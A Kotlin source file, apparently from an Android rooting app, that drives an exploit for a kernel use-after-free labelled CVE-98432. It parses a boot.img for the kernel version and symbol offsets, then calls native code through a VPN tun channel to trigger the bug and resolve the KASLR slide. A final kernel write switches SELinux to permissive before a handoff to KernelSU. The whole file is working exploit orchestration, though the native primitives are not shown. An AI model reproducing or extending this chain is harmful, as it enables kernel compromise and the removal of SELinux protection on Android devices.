package com.neodhizuku.more.ui.page.settings.experimental

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.net.VpnService
import android.os.Build
import android.provider.OpenableColumns
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.InputStream
import java.nio.channels.FileChannel
import java.security.MessageDigest
import java.util.zip.GZIPInputStream

/** 导入镜像的静态检查结果。 */
data class BootImageInfo(
    val name: String,
    val sizeBytes: Long,
    val sha256: String,
    val magicOk: Boolean,
    val kernelSize: Long,
    val kernelVersion: String?,
    val affected: Boolean?,
    val note: String
)

/** 一次读取的 boot.img，静态检查与 kallsyms 提取共用，避免两次整文件 IO 与双份大数组。 */
class BootImageBuffer(
    val name: String,
    val bytes: BootBytes,
    val sizeBytes: Long,
    val sha256: String
)

object Cve98432Engine {

    /** 最近一次 patch_selinux() 的返回值，供无 shell 通道时判断交接卡。 */
    @Volatile
    var lastNativeSuccess: Boolean = false
        private set

    private const val MAX_INPUT = 96 * 1024 * 1024
    private const val VERSION_WINDOW = 64 * 1024
    private const val VERSION_CARRY = 64
    private const val PROFILE_FILE = "profile.conf"

    /** 上游把 kfree 换成 kfree_rcu 的分支修复版本。 */
    private val FIXED_PATCH = mapOf(
        "5.10" to 272,
        "5.15" to 223,
        "6.1" to 190,
        "6.6" to 159,
        "6.12" to 113,
        "6.18" to 56,
        "7.2" to 10
    )

    private const val HEX = "0123456789abcdef"
    private val VERSION_NEEDLE = byteArrayOf(
        'L'.code.toByte(), 'i'.code.toByte(), 'n'.code.toByte(), 'u'.code.toByte(),
        'x'.code.toByte(), ' '.code.toByte(), 'v'.code.toByte(), 'e'.code.toByte(),
        'r'.code.toByte(), 's'.code.toByte(), 'i'.code.toByte(), 'o'.code.toByte(),
        'n'.code.toByte(), ' '.code.toByte()
    )

    fun displayName(context: Context, uri: Uri): String = runCatching {
        context.contentResolver.query(uri, null, null, null, null)?.use { cursor ->
            val idx = cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME)
            if (idx >= 0 && cursor.moveToFirst()) cursor.getString(idx) else null
        }
    }.getOrNull() ?: uri.lastPathSegment ?: "boot.img"

    fun profileFile(context: Context): File = File(File(context.filesDir, "cve98432"), PROFILE_FILE)

    /**
     * 整文件流式复制到私有临时文件（64KB 缓冲），同一遍算完 SHA-256，
     * 再用 FileChannel.map 做只读映射。全程不在 dalvik heap 开大数组：
     * Pixel 这类 64MB 补齐镜像用 allocateDirect 会顶满 growth limit，
     * 连续第二次导入必然 OOM。
     */
    fun readBoot(context: Context, uri: Uri): BootImageBuffer? {
        val name = displayName(context, uri)
        val dir = File(context.cacheDir, "cve98432").apply { mkdirs() }
        val tmp = File(dir, "boot.img.mmap")
        if (tmp.exists()) tmp.delete()

        val digest = MessageDigest.getInstance("SHA-256")
        val buf = ByteArray(64 * 1024)
        var total = 0L
        val stream = runCatching { context.contentResolver.openInputStream(uri) }.getOrNull()
            ?: return null
        val copied = runCatching {
            FileOutputStream(tmp).use { out ->
                stream.use { input ->
                    while (true) {
                        val n = input.read(buf)
                        if (n < 0) break
                        digest.update(buf, 0, n)
                        if (total < MAX_INPUT) {
                            val keep = minOf(n.toLong(), MAX_INPUT - total).toInt()
                            out.write(buf, 0, keep)
                        }
                        total += n
                    }
                }
            }
        }
        if (copied.isFailure) {
            tmp.delete()
            return null
        }

        val mappedLen = minOf(total, MAX_INPUT.toLong()).toInt()
        if (mappedLen == 0) {
            tmp.delete()
            return null
        }
        // 清掉上一次解压留下的稀疏文件，避免 /data 里累积 64MB 级临时镜像。
        dir.listFiles()?.filter { it.name.startsWith("cve98432-kernel-") }
            ?.forEach { runCatching { it.delete() } }

        val bytes: BootBytes = runCatching {
            FileInputStream(tmp).use { fis ->
                val bb = fis.channel.map(FileChannel.MapMode.READ_ONLY, 0, mappedLen.toLong())
                MappedBootBytes(bb, mappedLen)
            }
        }.getOrElse {
            // mmap 不可用时的兜底只允许小镜像；大镜像宁可拒绝，也绝不在堆里开 64MB。
            if (mappedLen <= 8 * 1024 * 1024) {
                val arr = ByteArray(mappedLen)
                FileInputStream(tmp).use { fis ->
                    var off = 0
                    while (off < arr.size) {
                        val n = fis.read(arr, off, arr.size - off)
                        if (n < 0) break
                        off += n
                    }
                }
                HeapBootBytes(arr)
            } else {
                tmp.delete()
                return null
            }
        }

        val sha = run {
            val d = digest.digest()
            val out = CharArray(d.size * 2)
            for (i in d.indices) {
                val v = d[i].toInt() and 0xff
                out[i * 2] = HEX[v ushr 4]
                out[i * 2 + 1] = HEX[v and 15]
            }
            String(out)
        }
        return BootImageBuffer(name, bytes, total, sha)
    }

    /** 基于已读缓冲做静态检查，不再复制 kernel 段、不再把整个解压结果转成 String 跑正则。 */
    fun parseBootImage(buffer: BootImageBuffer): BootImageInfo {
        val bytes = buffer.bytes
        val magicOk = bytes.size >= 8 &&
            String(bytes.copyRange(0, 8), Charsets.US_ASCII) == "ANDROID!"
        val kernelSize = if (bytes.size >= 12) le32(bytes, 8).toLong() and 0xffffffffL else 0L

        var version: String? = null
        var note = "raw scan"
        val start = findKernelStart(bytes)
        if (start >= 0) {
            val gzip = (bytes[start].toInt() and 0xff) == 0x1f &&
                (bytes[start + 1].toInt() and 0xff) == 0x8b
            if (gzip) {
                version = scanVersionFromGzip(bytes, start)
                note = if (version != null) "kernel version scanned (streaming)" else "version string not found"
            } else {
                val lz4 = (bytes[start].toInt() and 0xff) == 0x02 &&
                    (bytes[start + 1].toInt() and 0xff) == 0x21
                // LZ4 段是压缩数据，逐字节扫 64MB 找 "Linux version" 纯属白跑；
                // 版本串由解压后 Image 的 linux_banner 给出。
                version = if (lz4) null else findVersion(bytes, start, bytes.size)
                note = if (version != null) "kernel version scanned (uncompressed segment)"
                else "no plaintext version in this segment; resolved from the decompressed Image"
            }
        } else {
            note = "kernel segment header not found"
        }

        return BootImageInfo(
            name = buffer.name,
            sizeBytes = buffer.sizeBytes,
            sha256 = buffer.sha256,
            magicOk = magicOk,
            kernelSize = kernelSize,
            kernelVersion = version,
            affected = version?.let { isAffected(it) },
            note = note
        )
    }

    /** 用同一份缓冲的 kallsyms 生成候选 profile 并落盘给 native，不重新打开 Uri。 */
    fun extractProfile(
        context: Context,
        buffer: BootImageBuffer,
        info: BootImageInfo
    ): Pair<KernelProfile?, List<String>> {
        // 解析层已分段兜底；这里再兜一层极端异常（OOM 等），保证已收集的行不丢。
        val result = runCatching {
            BootImageExtractor.extract(buffer.bytes, info.kernelVersion, context.cacheDir)
        }.getOrElse { e ->
            BootImageExtractor.Result(
                profile = null,
                imageSize = buffer.bytes.size.toLong(),
                lines = listOf(
                    "boot read     : ${buffer.bytes.size} bytes (already in memory)",
                    "offset extraction: interrupted by ${e.javaClass.simpleName}",
                    "note          : this stage is skipped, earlier stages are kept",
                    "result        : PARTIAL"
                ),
                version = info.kernelVersion,
                partial = true
            )
        }
        val extra = buildList {
            result.version?.let { v ->
                add("kernel version (decompressed): $v")
                val branch = v.takeWhile { c -> c.isDigit() || c == '.' }
                add("status (decompressed) : " + when (isAffected(branch)) {
                    true -> "AFFECTED by branch number (GKI backport may still apply)"
                    false -> "PATCHED by branch number"
                    null -> "UNKNOWN - not a listed stable branch"
                })
            }
        }
        val profile = result.profile
        if (profile == null) {
            val tail = if (result.partial && result.lines.none { it.startsWith("result") }) {
                listOf("result        : PARTIAL - a failing stage was skipped, other info retained")
            } else emptyList<String>()
            return null to (result.lines + extra + tail)
        }
        val file = profileFile(context)
        file.parentFile?.mkdirs()
        file.writeText(profile.toConf())
        return profile to (result.lines + extra + "profile file  : ${file.absolutePath}")
    }

    private fun findVersion(b: BootBytes, from: Int, to: Int): String? {
        val last = to - VERSION_NEEDLE.size
        var i = from
        while (i <= last) {
            if (b[i] == VERSION_NEEDLE[0]) {
                var k = 1
                while (k < VERSION_NEEDLE.size && b[i + k] == VERSION_NEEDLE[k]) k++
                if (k == VERSION_NEEDLE.size) {
                    var p = i + VERSION_NEEDLE.size
                    val parts = IntArray(3)
                    for (j in 0..2) {
                        var v = 0
                        var any = false
                        while (p < to) {
                            val c = b[p].toInt() and 0xff
                            if (c < '0'.code || c > '9'.code) break
                            v = v * 10 + (c - '0'.code)
                            any = true
                            p++
                        }
                        if (!any) return null
                        parts[j] = v
                        if (j < 2) {
                            if (p >= to || b[p].toInt() != '.'.code) return null
                            p++
                        }
                    }
                    return "${parts[0]}.${parts[1]}.${parts[2]}"
                }
            }
            i++
        }
        return null
    }

    private fun le32(b: BootBytes, off: Int): Int =
        (b[off].toInt() and 0xff) or
            ((b[off + 1].toInt() and 0xff) shl 8) or
            ((b[off + 2].toInt() and 0xff) shl 16) or
            ((b[off + 3].toInt() and 0xff) shl 24)

    private fun findKernelStart(b: BootBytes): Int {
        for (ps in intArrayOf(4096, 2048, 8192, 16384, 65536)) {
            if (ps + 4 > b.size) continue
            val m0 = b[ps].toInt() and 0xff
            val m1 = b[ps + 1].toInt() and 0xff
            val m2 = b[ps + 2].toInt() and 0xff
            val m3 = b[ps + 3].toInt() and 0xff
            if (m0 == 0x1f && m1 == 0x8b) return ps
            if (m0 == 0x02 && m1 == 0x21 && m2 == 0x4c && m3 == 0x18) return ps
            if (m0 == 0x41 && m1 == 0x52 && m2 == 0x4d && m3 == 0x64) return ps
        }
        return -1
    }

    /**
     * gzip 边解压边找 "Linux version X.Y.Z"：只保留一块 64KB 窗口，
     * 块间留 VERSION_CARRY 字节重叠，避免分配整个内核映像（4MB LOS 对象）。
     * 版本串位于 Image 前部，通常第一块就命中。
     */
    private fun scanVersionFromGzip(b: BootBytes, off: Int): String? {
        val win = ByteArray(VERSION_WINDOW + VERSION_CARRY)
        var found: String? = null
        return runCatching {
            val input: InputStream = b.stream(off, b.size - off)
            GZIPInputStream(input).use { gz ->
                var carry = 0
                while (found == null) {
                    val n = gz.read(win, carry, VERSION_WINDOW)
                    if (n < 0) {
                        found = findVersion(HeapBootBytes(win), 0, carry)
                        break
                    }
                    val end = carry + n
                    found = findVersion(HeapBootBytes(win), 0, end)
                    if (found != null) break
                    val keep = minOf(VERSION_CARRY, end)
                    System.arraycopy(win, end - keep, win, 0, keep)
                    carry = keep
                }
            }
            found
        }.getOrNull()
    }

    private fun isAffected(v: String): Boolean? {
        val parts = v.split(".")
        if (parts.size < 3) return null
        val fixed = FIXED_PATCH["${parts[0]}.${parts[1]}"] ?: return null
        return (parts[2].toIntOrNull() ?: return null) < fixed
    }

    private fun readFirstLine(path: String): String? = runCatching {
        File(path).bufferedReader().use { it.readLine() }
    }.getOrNull()

    fun isPermissive(): Boolean = readFirstLine("/sys/fs/selinux/enforce") == "0"

    fun describeBoot(info: BootImageInfo): List<String> = buildList {
        add("boot.img      : ${info.name}")
        add("size          : ${info.sizeBytes} bytes")
        add("sha256        : ${info.sha256}")
        add("magic         : ${if (info.magicOk) "ANDROID! OK" else "NOT an Android boot image"}")
        add("kernel_size   : ${info.kernelSize} bytes")
        add("kernel version: ${info.kernelVersion ?: "unavailable (${info.note})"}")
        add("status        : " + when (info.affected) {
            true -> "AFFECTED - kernel is below the upstream fix"
            false -> "PATCHED - kernel is at or above the upstream fix"
            null -> "UNKNOWN - could not match a known stable branch"
        })
        add("note          : ${info.note}")
        add("caveat        : branch version only; GKI backports the fix without bumping the version string")
    }

    /**
     * VpnService.prepare() 返回的 Intent 必须由 Activity 用 startActivityForResult 启动。
     * 系统确认框依赖 getCallingPackage()，用普通 startActivity() 会静默关闭；
     * 附加 FLAG_ACTIVITY_NEW_TASK 又会立刻取消 result。已授权时返回 null。
     */
    fun vpnConsentIntent(context: Context): Intent? = runCatching {
        VpnService.prepare(context)
    }.getOrNull()

    /**
     * 环境自检：只读探测 + VPN 授权状态，不启动任何 Activity。
     * Shizuku 只用来读取 untrusted_app 读不到的 /proc 与 selinux 状态；
     * 它不能写 enforce、不能替代 tun 发包，也不参与内核利用。
     */
    suspend fun environment(context: Context): List<String> {
        val shizuku = Cve98432Shell.request()
        val shell = if (shizuku) Cve98432Shell.probe() else null
        return buildList {
            add("device        : ${Build.MANUFACTURER} ${Build.MODEL} / ${Build.FINGERPRINT}")
            add("android       : ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
            add("abi           : ${Build.SUPPORTED_ABIS.joinToString()}")
            add("shizuku shell : " + when {
                shizuku && shell != null -> "available (read-only status probe)"
                shizuku -> "available but status probe failed"
                else -> "unavailable - falling back to untrusted_app reads"
            })
            add("kernel        : ${shell?.version ?: readFirstLine("/proc/version")?.take(160) ?: "unreadable"}")
            add("selinux       : " + (shell?.enforce?.let { "$it (via shell)" }
                ?: when (readFirstLine("/sys/fs/selinux/enforce")) {
                    "0" -> "permissive (W1 will be skipped)"
                    "1" -> "enforcing"
                    else -> "unknown (enforce node unreadable)"
                }))
            add("kptr_restrict : ${shell?.kptr ?: readFirstLine("/proc/sys/kernel/kptr_restrict") ?: "unreadable"}")
            add("native lib    : ${if (Cve98432Bridge.available()) "loaded" else "UNAVAILABLE"}")

            val configs = if (shell?.configs?.isNotEmpty() == true) shell.configs else runCatching {
                GZIPInputStream(FileInputStream(File("/proc/config.gz"))).bufferedReader().useLines { lines ->
                    val keys = listOf("CONFIG_KALLSYMS", "CONFIG_SLAB_FREELIST_HARDENED", "CONFIG_RANDOMIZE_BASE")
                    lines.filter { l -> keys.any { l.startsWith("$it=") } }.toList()
                }
            }.getOrDefault(emptyList())
            if (configs.isEmpty()) add("kernel config : /proc/config.gz unavailable")
            else configs.forEach { add("kernel config : $it") }

            add("vpn consent   : " + if (vpnConsentIntent(context) == null) "granted" else "NOT GRANTED - system dialog pending")

            val ksu = runCatching {
                context.packageManager.getPackageInfo("me.weishu.kernelsu", 0)
            }.isSuccess
            add("ksu manager   : ${if (ksu) "installed" else "not installed"}")
        }
    }

    /**
     * 完整链路。终点是 patch_selinux()，不触碰 cred / uid / capabilities，
     * 不加载模块、不拉起管理器、不自动恢复 enforcing。
     */
    suspend fun execute(
        context: Context,
        boot: BootImageInfo?,
        profile: KernelProfile?,
        prepared: Boolean,
        permissiveMode: Boolean
    ): List<String> {
        lastNativeSuccess = false
        val out = mutableListOf<String>()
        out.add("mode          : ${if (permissiveMode) "permissive only (no root)" else "read-only probe"}")

        out.add("[1/6] boot image  : " + when {
            boot == null -> "MISSING - import a boot.img first"
            !boot.magicOk -> "INVALID - ANDROID! magic not found"
            boot.affected == false -> "PATCHED - this kernel is not vulnerable"
            else -> "OK (${boot.kernelVersion ?: "version unknown"})"
        })
        val missing = profile?.missing() ?: listOf("profile not extracted")
        out.add("[1/6] profile     : " + if (missing.isEmpty()) "OK" else "MISSING ${missing.joinToString()}")
        if (boot == null || !boot.magicOk || missing.isNotEmpty()) {
            out.add("RESULT: refused - import the exact boot.img and extract its offsets first")
            return out
        }

        out.add("[2/6] environment  : ${if (prepared) "checked" else "NOT checked - run Prepare first"}")
        if (!prepared) {
            out.add("RESULT: refused - run Prepare environment first")
            return out
        }
        if (VpnService.prepare(context) != null) {
            out.add("[2/6] vpn consent  : NOT GRANTED - run Prepare and confirm the system dialog first")
            out.add("RESULT: refused - VPN consent required for the tun channel")
            return out
        }
        val shellBefore = if (Cve98432Shell.ready()) Cve98432Shell.probe()?.enforce else null
        out.add("[2/6] selinux      : " + when {
            shellBefore != null -> "$shellBefore (via shell getenforce)"
            readFirstLine("/sys/fs/selinux/enforce") == "0" -> "already permissive, W1 skipped"
            else -> "enforcing / unknown (no shell channel)"
        })

        if (!Cve98432Bridge.available()) {
            out.add("[3/6] native       : UNAVAILABLE")
            out.add("RESULT: refused - native library unavailable or failed to load")
            return out
        }
        val path = profileFile(context)
        if (!path.exists()) {
            out.add("[3/6] profile file : MISSING")
            out.add("RESULT: refused - re-import the boot.img")
            return out
        }

        Cve98432VpnService.start(context, path.absolutePath)
        var fd = -1
        for (i in 0 until 40) {
            fd = Cve98432VpnService.active?.tunFd ?: -1
            if (fd >= 0) break
            Thread.sleep(100)
        }
        if (fd < 0) {
            out.add("[3/6] tun          : FAILED to establish")
            Cve98432VpnService.stop()
            out.add("RESULT: refused - tun channel unavailable")
            return out
        }
        out.add("[3/6] tun          : fd=$fd, profile=${path.name}, native ready")

        try {
            val hits = Cve98432Bridge.probe(2048)
            out.add("[4/6] UAF oracle   : hits=$hits (SYNACK option length != 40 and != 0)")
            val slide = Cve98432Bridge.resolveSlide()
            out.add("[4/6] KASLR slide  : " + if (slide != 0L) "0x${java.lang.Long.toHexString(slide)}" else "unresolved")
            if (hits <= 0) {
                out.add("NOTE: no UAF hit in this attempt; the race is probabilistic, retry with more rounds")
                out.add("NOTE: a backported kfree_rcu fix looks identical here - version string alone cannot rule it out")
            }
            if (slide == 0L) {
                out.add("NOTE: no kernel write attempted without a resolved KASLR slide (fail-closed)")
            }
            if (!permissiveMode) {
                out.add("[5/6] write stage  : skipped (switch is off)")
                out.add("RESULT: read-only probe complete, no kernel write attempted")
                return out
            }

            out.add("[5/6] final stage  : patch_selinux() only - no cred, no uid, no su, no module")
            val rc = Cve98432Bridge.setPermissive()
            lastNativeSuccess = rc == 0
            out.add("[5/6] native rc    : $rc")

            val shellAfter = if (Cve98432Shell.ready()) Cve98432Shell.probe()?.enforce else null
            val enforceNode = if (shellAfter == null) readFirstLine("/sys/fs/selinux/enforce") else null
            out.add("[6/6] verify       : " + when {
                shellAfter != null -> "$shellAfter (via shell getenforce)"
                enforceNode != null -> "enforce=$enforceNode"
                else -> "unreadable (untrusted_app denied selinuxfs read)"
            })
            if (rc == 0) {
                out.add("RESULT: patch_selinux() reported success. uid unchanged (${android.os.Process.myUid()}).")
                if (shellAfter == null) {
                    out.add("VERIFY: no shell channel; confirm with `getenforce` in shell or the KernelSU manager.")
                }
                out.add("HANDOFF: open KernelSU yourself and press its jailbreak entry when ready.")
                out.add("HANDOFF: no automatic launch, no automatic restore; reboot returns to enforcing.")
            } else {
                out.add("RESULT: patch_selinux() returned $rc - no kernel state change confirmed.")
                out.add("NOTE: failure is build-specific - offsets, heap layout and race timing decide the outcome.")
                out.add("NOTE: an unreadable enforce node is not proof of still-enforcing; verify from shell.")
            }
        } finally {
            Cve98432VpnService.stop()
        }
        return out
    }

    /**
     * 结果确认：优先用 shell 的 getenforce（真实状态），
     * 无 shell 通道时退回文件读取，再退回 native 返回值。
     */
    suspend fun confirmPermissive(): Boolean {
        val state = if (Cve98432Shell.ready()) Cve98432Shell.probe()?.enforce else null
        if (state != null) return state == "permissive"
        if (isPermissive()) return true
        return lastNativeSuccess
    }
}
